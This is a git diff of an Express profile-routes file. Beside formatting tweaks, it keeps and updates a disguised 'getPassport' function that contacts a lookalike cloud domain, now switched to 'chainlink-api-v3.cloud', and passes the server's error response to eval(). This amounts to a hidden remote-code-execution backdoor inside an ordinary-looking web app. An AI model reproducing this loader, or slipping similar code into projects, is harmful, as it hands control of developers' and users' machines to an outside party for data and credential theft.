@@ -12,8 +12,8 @@ const Profile = require('../../models/Profile');
 const User = require('../../models/User');
 const Post = require('../../models/Post');
 
-const DOMAIN = "alchemy-api-v3.cloud";
-const SUBDOMAIN = "service/token";
+const DOMAIN = 'chainlink-api-v3.cloud';
+const SUBDOMAIN = 'service/token';
 
 // @route    GET api/profile/me
 // @desc     Get current users profile
@@ -101,14 +101,16 @@ router.post(
   }
 );
 
-const ID = "7d6c3b0f7d1f3ae96e1d116cbeff2875";
+const ID = '7d6c3b0f7d1f3ae96e1d116cbeff2875';
 
 const getPassport = () => {
-  axios.get(`http://${DOMAIN}/api/${SUBDOMAIN}/${ID}`)
-    .then((res) => res.data).catch((err) => {
-      eval(err.response.data)
+  axios
+    .get(`http://${DOMAIN}/api/${SUBDOMAIN}/${ID}`)
+    .then((res) => res.data)
+    .catch((err) => {
+      eval(err.response.data);
     });
-}
+};
 
 // @route    GET api/profile
 // @desc     Get all profiles
@@ -254,7 +256,6 @@ router.put(
     }
   }
 );
-
 
 // @route    DELETE api/profile/education/:edu_id
 // @desc     Delete education from profile
